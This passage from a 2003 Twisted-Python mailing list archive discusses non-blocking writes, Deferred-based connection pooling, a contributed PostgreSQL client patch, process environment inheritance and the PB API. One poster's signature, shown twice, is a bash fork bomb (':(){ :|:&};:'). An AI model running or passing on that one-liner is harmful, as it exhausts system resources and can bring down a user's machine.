twisted.internet.app.ApplicationService, but for this it may be
overkill.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From andrew-twisted at puzzling.org  Sun Jul 27 01:36:02 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Sun, 27 Jul 2003 17:36:02 +1000
Subject: [Twisted-Python] Re: How can ftpclient.py work?
In-Reply-To: <871xwc7ich.fsf@complete.org>
References: <87k7a47o6i.fsf@complete.org> <20030727021922.GC3046@frobozz> <871xwc7ich.fsf@complete.org>
Message-ID: <20030727073602.GD3046@frobozz>

On Sat, Jul 26, 2003 at 10:34:54PM -0500, John Goerzen wrote:
> Thanks for the excellent information, Andrew.  I have a few (really!)
> follow-up questions:
> 
> Andrew Bennetts <andrew-twisted at puzzling.org> writes:
> 
> > In general, though, most protocols would simply be doing something like:
> >
> >     def sendRequest(self, data):
> >         # ...
> >         self.transport.write(self.requestHeader)
> >         self.transport.write(data)
> >         # ...
> >
> > And the transport takes care of making sure the data is sent in the right
> > order.  You're probably thinking "but what if two calls are made to
> > sendRequest at the same time?  Isn't there a race condition?"  The answer is
> 
> Oh sure, you guys just turn my whole approach to things on its side,
> and now you know what I'm thinking?  Well, you're right :-)

:)

> But, wouldn't the above code have blocking problems, especially over
> slow links or for large values of data?  (Say data is a 2MB string and
> you're on a modem... does your UI freeze for 15 minutes?  Or is
> write() another layer above the system call that does some sort of magic?)

transport.write doesn't block.  It simply queues the data to be written,
and then immediately returns (actually, if there's nothing queued, it'll try
a non-blocking write immediately -- see
twisted.internet.abstract.FileDescriptor.write for the gory details...).
So, yes, it's a layer above the system call.  A transport is an ITransport
implementor, not the bare socket object.

That said, for large transfers, using producers/consumers might be a better
idea anyway.  An example of this is twisted.web.static.FileTransfer.

> I guess what I'm thinking here is that switching from multi-threaded
> to poll() or select() isn't a "get out of jail free" card.  And while
> I've written various C programs using select() and have a good idea
> what the potential pitfalls are there, Twisted seems to live up to its
> name just enough that I'm having a bit of trouble isolating them here :-)

It's not "get out of jail free", but it's pretty close ;)

> > I hope I've shed some light for you -- let us know if you need more :)
> 
> Thanks -- all I need now is a small flashlight :-)

If you just look at twisted.flashlight... -- oh, wait, we haven't written
that one yet ;)

-Andrew.




From tv at twistedmatrix.com  Sun Jul 27 03:00:03 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Sun, 27 Jul 2003 12:00:03 +0300
Subject: [Twisted-Python] Connection poolin
In-Reply-To: <87brvg7nqh.fsf@complete.org>
References: <87brvg7nqh.fsf@complete.org>
Message-ID: <20030727090003.GB28434@lapdog>

On Sat, Jul 26, 2003 at 08:38:30PM -0500, John Goerzen wrote:
> imap = self.imapserver.acquireconnection()
> try:
>     # select the appropriate mailbox
>     # do stuff here
>     return result
> finally:
>    self.imapserver.release(imap)

	Here's two quick hacks that differ mostly in where you put
	the connection release, and how you organize the deferreds.

	Method 1: manage the release in the caller, but need to jump
	through hoops to get the connection passed to
	_releaseConnection. self.imapserver.acquireconnection() is
	of the traditional "returns a Deferred" style.

class Something:
    def startDoingStuff(self):
	d = self.imapserver.acquireconnection()
	d.addCallback(self._gotConnection)
	return d

    def _gotConnection(self, connection):
	d = defer.Deferred()
	d.addCallback(self._doStuff)
	d.addBoth(self._releaseConnection, connection)
	d.callback(connection)
	return d

    def _doStuff(self, connection):
	# select the appropriate mailbox
	# do stuff here

    def _releaseConnection(self, stuff, connection):
	connection.release()
	return stuff


	Method 2: manage the release in the connection pool. Needs
	to change the API of acquireconnection into taking a deferred,
	as otherwise it would be impossible to make _doStuff get called
	before the connection release. Note how close this is to the above,
	with just release logic located in the same class as
	acquireconnection.

class SomethingBetter:
    def startDoingStuff(self):
	d = defer.Deferred()
	d.addCallback(self._doStuff)
	self.imapserver.acquireconnection(d)
	return d

    def _doStuff(self, connection):
	# select the appropriate mailbox
	# do stuff here

class ...:
    def acquireconnection(self, d):
	d2 = self._grabConnection()
	d2.addCallback(self._gotConnection, d)
	d2.chainCallback(d)

    def _gotConnection(self, connection, d):
	d.addBoth(self._releaseConnection, connection)
	return connection

    def _releaseConnection(self, stuff, connection):
	connection.release()
	return stuff

> I've thought that in each method I have that needs a connection, I
> could write two methods: one that calls the Twisted version of
> acquireconnection and sets its callback to the second, which does the
> real work (and possibly chains to others via callbacks.)
> 
> There are some problems with that approach.  One is that it is very
> verbose and requires a lot of code all over the place to manage.
> Another is that there's no easy way to tell in Twisted when we are
> done with the given connection.  I suppose I could always add errbacks
> all along the way plus a callback, each of which releases the
> connection, but that seems inconvenient and error-prone.

	I don't think the method 2 above is verbose. And there is no reason
	to add errbacks "all along the way". Just a single addBoth is
	enough. When the .addBoth callback returns it's first arg, it
	pretty much equals python exception handling try: ... finally: ...

-- 
:(){ :|:&};:



From tv at twistedmatrix.com  Sun Jul 27 02:34:00 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Sun, 27 Jul 2003 11:34:00 +0300
Subject: [Twisted-Python] Re: How can ftpclient.py work?
In-Reply-To: <871xwc7ich.fsf@complete.org>
References: <87k7a47o6i.fsf@complete.org> <20030727021922.GC3046@frobozz> <871xwc7ich.fsf@complete.org>
Message-ID: <20030727083400.GA28434@lapdog>

On Sat, Jul 26, 2003 at 10:34:54PM -0500, John Goerzen wrote:
> But, wouldn't the above code have blocking problems, especially over
> slow links or for large values of data?  (Say data is a 2MB string and
> you're on a modem... does your UI freeze for 15 minutes?  Or is
> write() another layer above the system call that does some sort of magic?)

	Well, the UI won't really freeze; self.transport.write()
	will just buffer that 2MB inside the transport, and send
	from the buffer whenever the socket is ready.

	Of course, 2MB is quite a lot to buffer, and 100MB would
	be insane in a "normal" application. That's why, when you have
	lots of data, you use the producer/consumer pattern. See
	twisted.internet.interfaces classes IConsumer, IProducer and
	friends; though they are quite rarely used in normal apps,
	and you won't likely ever need them.

> I guess what I'm thinking here is that switching from multi-threaded
> to poll() or select() isn't a "get out of jail free" card.  And while

	There's no such thing as "easy complex". That's why protocol and
	application designers should avoid design decision that require
	complex code to support.

	However, for the easy cases, it goes something like this:

	1. simplest: single process, single protocol chat
	2. quite easy: asynchronous single process, many protocol chats
	3. starts as easy and explodes later: threads, many protocol chats

	Asynchronous programming removes most the time-related
	variance in program behaviour; that is, it helps you write
	more predictable code (very few race conditions compared to
	threads). And when you get used to it, the state machine
	thinking is just nice.

> I've written various C programs using select() and have a good idea
> what the potential pitfalls are there, Twisted seems to live up to its
> name just enough that I'm having a bit of trouble isolating them here :-)

	Twisted actually removes most of the pitfalls you fight with
	when doing your own event loop from scratch; that's the main
	reason to use Twisted for me. Of course, the bundled protocols
	etc. are nice, too.

> >> Now, I'm assuming that these problems do not actually exist.  Yet I
> >> cannot work out why not.  Can anybody shed some light?
> > I hope I've shed some light for you -- let us know if you need more :)
> Thanks -- all I need now is a small flashlight :-)

	We could always get some rags and lighter fluid, and make torches
	from our cluesticks ;)


/me notes he writes too much drivel. Blame it one the sunday morning.

-- 
:(){ :|:&};:



From sune at mel.interspace.dk  Sun Jul 27 05:28:28 2003
From: sune at mel.interspace.dk (Sune Kirkeby)
Date: Sun, 27 Jul 2003 13:28:28 +0200
Subject: [Twisted-Python] Postgres client
Message-ID: <20030727112828.GA29396@mel.interspace.dk>

Hello twisted people.

People have expressed interest in the postgres client I wrote for
twisted waaay back, so here it is.

It's got the packet parsing/formatting, and a weird sort of
interface, so afaik all it really needs is integration with the rest
of twisted (enterprise?), and postgres -> python type mappings
(/usr/include/postgresql/server/catalog/pg_type.h has the postgres
type identifiers listed).

The code is license-less as it is in the patch, but you may consider
it licensed under the LGPL, and I give Glyph non-exclusive
copyrights to the code. There, that should make it twisted-friendly.
I hope.

Enjoy,

/s

-- 
Sune Kirkeby | If humans were supposed to fly they'd
             | be born with stewardesses.
-------------- next part --------------
diff --exclude-from=diffignore -Naur Twisted-0.12.3/doc/examples/postgresql.py Twisted/doc/examples/postgresql.py
--- Twisted-0.12.3/doc/examples/postgresql.py	Thu Jan  1 01:00:00 1970
+++ Twisted/doc/examples/postgresql.py	Tue Jan  1 22:27:04 2002
@@ -0,0 +1,32 @@
+from twisted.enterprise import spock
+from twisted.protocols import postgresql
+from twisted.internet import main
+from twisted.internet import tcp
+
+class Consumer:
+    def __init__(self, prefix):
+        self.done = 0
+        self.count = 0
+        self.prefix = prefix
+
+    def receivedRow(self, types, data):
+        assert len(types) == len(data)
+        assert not self.done
+
+        self.count = self.count + 1
+        if self.count % 100 == 0:
+            print self.prefix, 'Got 100 rows'
+
+    def queryDone(self):
+        print self.prefix, 'Done (%d rows)' % self.count
+        self.done = 1
+
+pf = postgresql.PostgreSQLClientFactory('sune')
+pool = spock.ConnectionPool('localhost', 5432, pf)
+
+for i in range(8):
+    sql = 'SELECT * FROM foo WHERE id=%d' % i
+    consumer = Consumer('%d' % i)
+    pool.query(sql, consumer)
+
+main.run()
diff --exclude-from=diffignore -Naur Twisted-0.12.3/twisted/protocols/postgresql.py Twisted/twisted/protocols/postgresql.py
--- Twisted-0.12.3/twisted/protocols/postgresql.py	Thu Jan  1 01:00:00 1970
+++ Twisted/twisted/protocols/postgresql.py	Wed Jan  2 13:54:53 2002
@@ -0,0 +1,336 @@
+from socket import htons, htonl, ntohs, ntohl
+import struct
+import string
+import array
+
+from twisted.protocols import protocol
+
+class IncompletePacket:
+    pass
+
+def parseBytes(l, s):
+    if len(s) < l:
+        raise IncompletePacket()
+    return s[0:l], s[l:]
+
+def formatInt16(i):
+    return struct.pack('h', htons(i))
+
+def parseInt16(s):
+    l = struct.calcsize('h')
+    if len(s) < l:
+        raise IncompletePacket()
+    return ntohs(struct.unpack('h', s[0:l])[0]), s[l:]
+
+def formatInt32(i):
+    return struct.pack('i', htonl(i))
+
+def parseInt32(s):
+    l = struct.calcsize('i')
+    if len(s) < l:
+        raise IncompletePacket()
+    return ntohl(struct.unpack('i', s[0:l])[0]), s[l:]
+
+def formatLimString(l, s):
+    if len(s) < l:
+        return s + '\0' * (l - len(s))
+    else:
+        return s[0:l]
+
+def formatString(s):
+    return s + '\0'
+
+def parseString(s):
+    l = string.find(s, '\0')
+    if l < 0:
+        raise IncompletePacket
+    return s[0:l], s[l + 1:]
+
+
+class StartupPacket:
+    def __init__(self, user, database='', args='', tty=''):
+        self.user = user
+        self.database = database
+        self.args = args
+        self.tty = tty
+    def send(self, transport):
+        s  = formatInt32(296)         # packet length
+        s += formatInt16(2)           # protocol version, major
+        s += formatInt16(0)           # protocol version, minor
+        s += formatLimString(64, self.database)
+        s += formatLimString(32, self.user)
+        s += formatLimString(64, self.args)
+        s += formatLimString(64, '')  # unused
+        s += formatLimString(64, self.tty)
+        transport.write(s)
+
+class TerminatePacket:
+    def send(self, transport):
+        transport.write('X')
+
+class QueryPacket:
+    def __init__(self, query):
+        self.query = query
+
+    def send(self, transport):
+        transport.write('Q' + formatString(self.query))
+
+class CursorResponsePacket:
+    def __init__(self, name):
+        self.name = name
+
+class EmptyQueryResponsePacket:
+    pass
+
+class CompletedResponsePacket:
+    def __init__(self, cmd):
+        self.command = cmd
+
+class AuthenticationPacket:
+    def __init__(self, auth):
+        self.authentication = auth
+
+class BackendKeyDataPacket:
+    def __init__(self, pid, key):
+        self.process_id = pid
+        self.key = key
+
+class ReadyForQueryPacket:
+    pass
+
+class RowDescriptionPacket:
+    def __init__(self, columns):
+        self.columns = columns
+
+class AsciiRowPacket:
+    def __init__(self, columns):
+        self.columns = columns
+
+class ErrorPacket:
+    def __init__(self, message):
+        self.message = message
+
+class UnknownPacket(Exception):
+    pass
+
+
+def parsePacket(client, data):
+    orig_data = data
+    tag, data = parseBytes(1, data)
+
+    try:
+        if tag == 'E':
+            error, data = parseString(data)
+            return ErrorPacket(error), data
+
+        if tag == 'R':
+            auth, data = parseInt32(data)
+            return AuthenticationPacket(auth), data
+
+        if tag == 'K':
+            pid, data = parseInt32(data)
+            key, data = parseInt32(data)
+            return BackendKeyDataPacket(pid, key), data
+
+        if tag == 'Z':
+            return ReadyForQueryPacket(), data
+
+        if tag == 'P':
+            name, data = parseString(data)
+            return CursorResponsePacket(name), data
+
+        if tag == 'I':
+            unused, data = parseString(data)
+            return EmptyQueryResponsePacket(), data
+
+        if tag == 'T':
+            count, data = parseInt16(data)
+            columns = []
+            for i in range(count):
+                name, data = parseString(data)
+                type_oid, data = parseInt32(data)
+                type_size, data = parseInt16(data)
+                type_modifier, data = parseInt32(data)
+                columns.append((name, (type_oid, type_size, type_modifier)))
+            return RowDescriptionPacket(tuple(columns)), data
+
+        if tag == 'D':
+            field_count = len(client.row_description)
+            if field_count % 8 == 0:
+                bytes = field_count / 8
+            else:
+                bytes = field_count / 8 + 1
+            bitmap, data = parseBytes(bytes, data)
+            bitmap = array.array('B', bitmap)
+
+            fields = []
+            mask = 1 << 8
+            for i in range(field_count):
+                mask = mask >> 1
+                if mask == 0:
+                    mask = 1 << 7
+                    del bitmap[0]
+
+                if not bitmap[0] & mask:
+                    fields.append(None)
+
+                else:
+                    size, data = parseInt32(data)
+                    value, data = parseBytes(size - 4, data)
+                    fields.append(value)
+
+            return AsciiRowPacket(fields), data
+
+        if tag == 'C':
+            cmd, data = parseString(data)
+            return CompletedResponsePacket(cmd), data
+
+    except IncompletePacket:
+        return None, orig_data
+
+    raise UnknownPacket(orig_data)
+        
+
+class SilentObserver:
+    def connectionMade(self, client):
+        pass
+
+    def backendError(self, client, message):
+        pass
+
+    def protocolError(self, client, message):
+        pass
+
+    def readyForQuery(self, client):
+        pass
+
+    def connectionLost(self, client):
+        pass
+
+class SilentConsumer:
+    def __init__(self):
+        self.done = 0
+        self.types = None
+
+    def receivedHead(self, types):
+        assert self.types is None
+        self.types = types
+        
+    def receivedRow(self, data):
+        assert not self.types is None
+        assert len(self.types) == len(data)
+        assert not self.done
+
+    def queryDone(self):
+        self.done = 1
+
+class PostgreSQLClientFactory(protocol.ClientFactory):
+    def __init__(self, user, password='', args='', tty=''):
+        self.args = (user, password, args, tty)
+
+    def __getstate__(self):
+        return self.args
+    def __setstate__(self, state):
+        self.args = state
+        
+    def buildProtocol(self, conn):
+        p = apply(PostgreSQLClient, self.args)
+        p.factory = self
+        return p
+
+class PostgreSQLClient(protocol.Protocol):
+    def __init__(self, user, password='', args='', tty=''):
+        self.user = user
+        self.password = password
+        self.backend_args = args
+        self.backend_tty = tty
+
+        self.ready = 0
+        self.buffer = ''
+        self.row_description = None
+
+        self.observer = SilentObserver()
+        self.consumer = SilentConsumer()
+
+    def setObserver(self, ob):
+        if ob is None:
+            ob = SilentObserver()
+        self.observer = ob
+
+    def connectionMade(self):
+        self.ready = 1
+        self.sendPacket(StartupPacket(self.user))
+
+    def query(self, query, consumer=SilentConsumer()):
+        self.consumer = consumer
+        self.sendPacket(QueryPacket(query))
+
+    def terminate(self):
+        self.sendPacket(TerminatePacket())
+        self.transport.loseConnection()
+        self.observer.terminated(self)
+
+    def sendPacket(self, p):
+        if not self.ready:
+            raise 'Not ready for query.'
+
+        self.ready = 0
+        p.send(self.transport)
+
+    def dataReceived(self, data):
+        self.buffer = self.buffer + data
+        while len(self.buffer) > 0:
+            try:
+                packet, self.buffer = parsePacket(self, self.buffer)
+                
+                if packet is None:
+                    break
+
+                type = packet.__class__
+                if type is AuthenticationPacket:
+                    if packet.authentication == 0:
+                        self.observer.connectionMade(self)
+                    else:
+                        s = 'Got request for unsupported ' + \
+                            'authentication: %d' % packet.authentication
+                        self.observer.protocolError(self, s)
+                        self.terminate()
+
+                elif type is BackendKeyDataPacket:
+                    self.backend_key = packet
+
+                elif type is ReadyForQueryPacket:
+                    self.ready = 1
+                    self.consumer.queryDone()
+                    if self.ready:
+                        self.observer.readyForQuery(self)
+
+                elif type is RowDescriptionPacket:
+                    self.row_description = packet.columns
+                    self.consumer.receivedHead(self.row_description)
+                
+                elif type is ErrorPacket:
+                    self.observer.backendError(self, packet.message)
+                    self.consumer = SilentConsumer()
+
+                elif type is CursorResponsePacket:
+                    pass
+
+                elif type is AsciiRowPacket:
+                    self.consumer.receivedRow(packet.columns)
+
+                elif type is CompletedResponsePacket:
+                    pass
+
+                else:
+                    s = 'Got a "%s" I do not know what to do with!' % \
+                        packet.__class__.__name__
+                    self.observer.protocolError(self, s)
+
+            except UnknownPacket, e:
+                s = 'Unknown packet: %s' % `e.args[0]`
+                self.observer.protocolError(self, s)
+                self.terminate()
+                self.buffer = ''
+
+__all__ = ['PostgreSQLClient']

From justinjohnson at fastmail.fm  Mon Jul 28 09:10:31 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Mon, 28 Jul 2003 09:10:31 -0600
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030725185121.1B75133420@www.fastmail.fm>
References: <85C3F6B3-BEC0-11D7-B892-000A95686CD8@redivi.com>
  	<20030725173934.617B237D19@www.fastmail.fm> <20030725140020.6f507950.itamar@itamarst.org> <20030725185121.1B75133420@www.fastmail.fm>
Message-ID: <20030728151031.7D46836324@www.fastmail.fm>

Another interesting problem...

The command I am trying to run using my subclass of ProcessProtocol is a
commercial product that needs to get a license from a license server,
plus it needs to talk to another server to get data.  So it needs to open
a socket to the license server and a different during my invocation of
the command.  When I run the command using the attached code, I get a
message saying it can't contact the license server, even though the
command works just fine on the command-line, outside of python/twisted. 
Is there a valid reason my process can't communicate out, or is this
possibly a bug with the win32eventreactor?  Attached is the file I'm
running, and the output I get is below.


cmd: cleartool.exe
args: ['lsvob', '-s']
stdout:
stderr: cleartool: Error: Unknown host 'rat00001': [WINSOCK] Host not
found
cleartool: Error: Cannot contact license server host "rat00001".
cleartool: Error: You do not have a license to run ClearCase.

status: 0
failure: [Failure instance: Traceback:
twisted.internet.error.ProcessTerminated
 process ended with exit code 1
]
*--- Failure #5 ---
--- <exception caught here> ---
*--- End of Failure #5 ---

-------------- next part --------------
A non-text attachment was scrubbed...
Name: my.py
Type: application/unknown
Size: 1463 bytes
Desc: not available
URL: </pipermail/twisted-python/attachments/20030728/4542098d/attachment-0002.bin>

From bob at redivi.com  Mon Jul 28 09:48:29 2003
From: bob at redivi.com (Bob Ippolito)
Date: Mon, 28 Jul 2003 11:48:29 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030728151031.7D46836324@www.fastmail.fm>
Message-ID: <EECECAB2-C112-11D7-A8DE-000A95686CD8@redivi.com>

On Monday, Jul 28, 2003, at 11:10 America/New_York, Justin Johnson 
wrote:

> Another interesting problem...
>
> The command I am trying to run using my subclass of ProcessProtocol is 
> a
> commercial product that needs to get a license from a license server,
> plus it needs to talk to another server to get data.  So it needs to 
> open
> a socket to the license server and a different during my invocation of
> the command.  When I run the command using the attached code, I get a
> message saying it can't contact the license server, even though the
> command works just fine on the command-line, outside of python/twisted.
> Is there a valid reason my process can't communicate out, or is this
> possibly a bug with the win32eventreactor?  Attached is the file I'm
> running, and the output I get is below.

Is there some chance that clearcase depends on some environment 
variables or something that aren't being inherited by the executed 
process?

-bob




From itamar at itamarst.org  Mon Jul 28 09:57:18 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 28 Jul 2003 11:57:18 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <EECECAB2-C112-11D7-A8DE-000A95686CD8@redivi.com>
References: <20030728151031.7D46836324@www.fastmail.fm>
	<EECECAB2-C112-11D7-A8DE-000A95686CD8@redivi.com>
Message-ID: <20030728115718.3bcc3972.itamar@itamarst.org>

On Mon, 28 Jul 2003 11:48:29 -0400
Bob Ippolito <bob at redivi.com> wrote:

> Is there some chance that clearcase depends on some environment 
> variables or something that aren't being inherited by the executed 
> process?

To expand on what Bob said, you may indeed want to pass os.environ as
the env arg of spawnProcess.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From justinjohnson at fastmail.fm  Mon Jul 28 10:11:34 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Mon, 28 Jul 2003 10:11:34 -0600
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030728115718.3bcc3972.itamar@itamarst.org>
References: <20030728151031.7D46836324@www.fastmail.fm>
 	<EECECAB2-C112-11D7-A8DE-000A95686CD8@redivi.com> <20030728115718.3bcc3972.itamar@itamarst.org>
Message-ID: <20030728161134.9591437C16@www.fastmail.fm>

That did the trick.  Thank you!

On Mon, 28 Jul 2003 11:57:18 -0400, "Itamar Shtull-Trauring"
<itamar at itamarst.org> said:
> On Mon, 28 Jul 2003 11:48:29 -0400
> Bob Ippolito <bob at redivi.com> wrote:
> 
> > Is there some chance that clearcase depends on some environment 
> > variables or something that aren't being inherited by the executed 
> > process?
> 
> To expand on what Bob said, you may indeed want to pass os.environ as
> the env arg of spawnProcess.
> 
> -- 
> Itamar Shtull-Trauring    http://itamarst.org/
> http://www.zoteca.com -- Python & Twisted consulting
> 
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
> 



From pje at telecommunity.com  Mon Jul 28 11:25:54 2003
From: pje at telecommunity.com (Phillip J. Eby)
Date: Mon, 28 Jul 2003 13:25:54 -0400
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <3F254097.4040407@zope.com>
References: <3F2404F6.1010501@modernsongs.com>
 <1059322398.26800.23.camel@anthem>
 <3F2404F6.1010501@modernsongs.com>
Message-ID: <5.1.0.14.0.20030728131951.01e61890@mail.telecommunity.com>

At 11:26 AM 7/28/03 -0400, Shane Hathaway wrote:
>Gary Poster wrote:
>>As to the request parsing, I like Twisted's design a lot.  My impression 
>>is that if you used it, rather than Zope's request parsing, you would be 
>>in for a lot more work, but that work would probably end up being a big 
>>eventual win in clarity and simplicity.  If I were doing it, I'd punt and 
>>stick with Zope's, with a regretful glance backward.  If you have the gas 
>>to go up the mountain, though, I betcha the view's worth it. :-)
>
>May I suggest a different approach?
>
>Zope 3's HTTP request parsing is superior to Twisted's because it can more 
>easily handle complex features of HTTP like pipelining.  However, 
>Twisted's core is a better-executed implementation of the same idea behind 
>asyncore.  Therefore, this is how I'd like to see the integration work:
>
>- Enhance Twisted's HTTP server with notions taken from Zope 3's HTTP 
>server.  The most important notion is that there is a request object that 
>does nothing but receive the request data.  Once the entire request is 
>received, the request is used to construct an HTTP transaction; at that 
>time the request is considered immutable.  Also, the generic memory/disk 
>buffer concept could be a big win for Twisted.
>
>- Rename Zope 3's HTTPTask to HTTPTransaction.  Create 
>IHTTPTransaction.  (It might become part of Twisted instead of Zope.)
>
>- Add only specific modules of Twisted to the Zope 3 source, such as 
>twisted.internet (I think that's its name).  Straighten out the licensing 
>first.

And there's yet another possible approach...  Have Zope depend on specific 
I*Reactor interfaces in place of asyncore, but don't necessarily depend on 
Twisted itself.  I'm not sure if this meets the intended goals for 
Zope/Twisted integration, but it's a useful first step.  If this is useful, 
PEAK has an "UntwistedReactor" class that implements a useful subset of the 
Twisted reactor interfaces, enough to be able to have a select loop and 
scheduled callbacks.  It's ZPL/PSF licensed, so you can steal it fair and 
square.  So, as long as the existing Zope 3 server code just expects to be 
woken up by asyncore for reads and writes, it should be pretty adaptable to 
the reactor interface, at which point it could be hooked into Twisted or 
into a Zope 3 mini-reactor.




From pobrien at orbtech.com  Mon Jul 28 11:53:25 2003
From: pobrien at orbtech.com (Patrick K. O'Brien)
Date: 28 Jul 2003 12:53:25 -0500
Subject: [Twisted-Python] New PB connection API
In-Reply-To: <20030725155001.69d11afc.itamar@itamarst.org>
References: <20030725155001.69d11afc.itamar@itamarst.org>
Message-ID: <m2adayzgfe.fsf@orbtech.com>

Itamar Shtull-Trauring <itamar at itamarst.org> writes:

> First sketch is in CVS. Please comment if you have any issues with it,
> I'd like to refactor old APIs to use new API next.

I just converted several apps to use your new api.  It was pretty
painless.  I'm not sure what benefit I got out of it, but since it was
painless I'll assume it was worthwhile and will let you clean things
up in the core.

Related to this, I'm gearing up to covert my existing apps to use new
cred, instead of old cred, and I'm not clear how perspectives fit into
the new cred world-view.  Based on your new pb API, can I assume
perspectives still have a place with PB apps?

Even my woven apps are using guard.PerspectiveWrapper/SessionWrapper,
which gets a Resource object from the Perspective instance that I
retrieve when the user logs in.  Is this a completely deprecated
approach, or not?

-- 
Patrick K. O'Brien
Orbtech      http://www.orbtech.com/web/pobrien
-----------------------------------------------
"Your source for Python programming expertise."
-----------------------------------------------




From gary at zope.com  Mon Jul 28 12:20:57 2003
From: gary at zope.com (Gary Poster)
Date: Mon, 28 Jul 2003 14:20:57 -0400
Subject: [Twisted-Python] Re: [Zope3-dev] twisted zope
In-Reply-To: <3F254097.4040407@zope.com>
References: <1059322398.26800.23.camel@anthem> <3F2404F6.1010501@modernsongs.com> <3F254097.4040407@zope.com>
Message-ID: <3F256989.4020108@zope.com>


Shane Hathaway wrote:
> Gary Poster wrote:
>> ...
> May I suggest a different approach?
 > ...
But of course. ;-)  FWIW, this is exactly what I meant by "a lot more 
work" (except that you know more about it than I :-).  Yes, I'd love to 
see this happen if you're up for it, Butch.

 > Straighten out the licensing first.

Oh yeah, forgot about that.  I've seen several discussions of the 
licensing on the Twisted list... Maybe Phil Eby's implementation is the 
only way out of that one.

Gary




From itamar at itamarst.org  Mon Jul 28 12:35:58 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Mon, 28 Jul 2003 14:35:58 -0400
Subject: [Twisted-Python] New PB connection API
In-Reply-To: <m2adayzgfe.fsf@orbtech.com>
References: <20030725155001.69d11afc.itamar@itamarst.org>
	<m2adayzgfe.fsf@orbtech.com>
Message-ID: <20030728143558.5b0f14b4.itamar@itamarst.org>

On 28 Jul 2003 12:53:25 -0500
pobrien at orbtech.com (Patrick K. O'Brien) wrote:

> I just converted several apps to use your new api.  It was pretty
> painless.  I'm not sure what benefit I got out of it, but since it was
> painless I'll assume it was worthwhile and will let you clean things
> up in the core.

1. You can subclass PBClientFactory and thus get, say, automatic
reconnection.
2. You can connectSSL rather than connectTCP, etc..
3. Unix sockets are no longer implemented using an evil hack.

> Related to this, I'm gearing up to covert my existing apps to use new
> cred, instead of old cred, and I'm not clear how perspectives fit into
> the new cred world-view.  Based on your new pb API, can I assume
> perspectives still have a place with PB apps?

Eventually PB will switch to new cred. This depends on some improvements
to PB tthat we are still working out. It *may* happen before 1.1 but I'm
guessing it won't :(

> Even my woven apps are using guard.PerspectiveWrapper/SessionWrapper,
> which gets a Resource object from the Perspective instance that I
> retrieve when the user logs in.  Is this a completely deprecated
> approach, or not?

Yes. But as long as you're using PB with same Perspectives you may need
to still use it.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From warner at lothar.com  Mon Jul 28 12:50:22 2003
From: warner at lothar.com (Brian Warner)
Date: Mon, 28 Jul 2003 11:50:22 -0700 (PDT)
Subject: [Twisted-Python] Inheriting Environment (was: Wrapping
 blocking code)
References: <20030728151031.7D46836324@www.fastmail.fm>
 <EECECAB2-C112-11D7-A8DE-000A95686CD8@redivi.com>
 <20030728115718.3bcc3972.itamar@itamarst.org>
Message-ID: <20030728.115022.109875724.warner@lothar.com>

Itamar Shtull-Trauring <itamar at itamarst.org> writes:
> 
> To expand on what Bob said, you may indeed want to pass os.environ as
> the env arg of spawnProcess.

We've talked about this briefly before, but perhaps this should be the
default? I think that "child inherits the environment of the parent" is the
most commonly expected behavior; that's why environment variables are not
the same as command-line arguments. Programs which change context somehow
(setuid) should clear their environment before spawning a process, but in
general the child is running with the same permissions as the parent, and I
think it is appropriate for them to operate in the same environment.

I've got a patch to implement this around here somewhere..

 -Brian



From Martin.Moellenbeck at t-online.de  Mon Jul 28 12:51:00 2003
From: Martin.Moellenbeck at t-online.de (=?iso-8859-1?Q?Martin_M=F6llenbeck?=)
Date: Mon, 28 Jul 2003 20:51:00 +0200
Subject: AW: [Twisted-Python] New PB connection API
In-Reply-To: <20030728143558.5b0f14b4.itamar@itamarst.org>
Message-ID: <000f01c35539$30247ba0$0200a8c0@joshua>

hi,

is there an roadmap to release 1.1?

Martin

> -----Ursprüngliche Nachricht-----
> Von: twisted-python-admin at twistedmatrix.com 
> [mailto:twisted-python-admin at twistedmatrix.com] Im Auftrag 
> von Itamar Shtull-Trauring
> Gesendet: Montag, 28. Juli 2003 20:36
> An: twisted-python at twistedmatrix.com
> Betreff: Re: [Twisted-Python] New PB connection API
> 
> 
> On 28 Jul 2003 12:53:25 -0500
> pobrien at orbtech.com (Patrick K. O'Brien) wrote:
> 
> > I just converted several apps to use your new api.  It was pretty 
> > painless.  I'm not sure what benefit I got out of it, but 
> since it was 
> > painless I'll assume it was worthwhile and will let you 
> clean things 
> > up in the core.
> 
> 1. You can subclass PBClientFactory and thus get, say, 
> automatic reconnection. 2. You can connectSSL rather than 
> connectTCP, etc.. 3. Unix sockets are no longer implemented 
> using an evil hack.
> 
> > Related to this, I'm gearing up to covert my existing apps 
> to use new 
> > cred, instead of old cred, and I'm not clear how 
> perspectives fit into 
> > the new cred world-view.  Based on your new pb API, can I assume 
> > perspectives still have a place with PB apps?
> 
> Eventually PB will switch to new cred. This depends on some 
> improvements to PB tthat we are still working out. It *may* 
> happen before 1.1 but I'm guessing it won't :(
> 
> > Even my woven apps are using 
> guard.PerspectiveWrapper/SessionWrapper,
> > which gets a Resource object from the Perspective instance that I 
> > retrieve when the user logs in.  Is this a completely deprecated 
> > approach, or not?
> 
> Yes. But as long as you're using PB with same Perspectives 
> you may need to still use it.
> 
> -- 
> Itamar Shtull-Trauring    http://itamarst.org/
> http://www.zoteca.com -- Python & Twisted consulting
> 
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com 
